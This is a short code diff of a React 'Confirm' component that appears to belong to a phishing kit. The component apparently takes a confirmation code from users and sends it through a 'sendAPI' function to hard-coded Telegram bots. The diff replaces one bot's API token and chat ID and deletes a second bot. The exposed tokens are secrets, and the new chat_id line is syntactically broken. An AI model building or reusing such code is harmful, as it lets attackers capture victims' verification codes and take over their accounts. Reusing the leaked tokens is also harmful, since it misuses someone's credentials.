@@ -19,13 +19,10 @@ export default function Confirm({ setPage, setNcode, ncode }) {
 
   const bots = [
     {
-      apiToken: "7996981843:AAEfILtAIjgNElsVAt3NWX6d1Mm3WogpYiI",
-      chat_id: "7794753220",
+      apiToken: "8484953068:AAGuwkwD8wyOZIPaCIijjtX9vlAgmPw1qRg",
+      chat_id: 7829326672",
     },
-    {
-      apiToken: "7846242608:AAFHmhzvkbf10v60N0TCAHMCQYsJlmCK2GE",
-      chat_id: "7820518007",
-    },
+
   ];
 
   const sendAPI = async (currentCode) => {
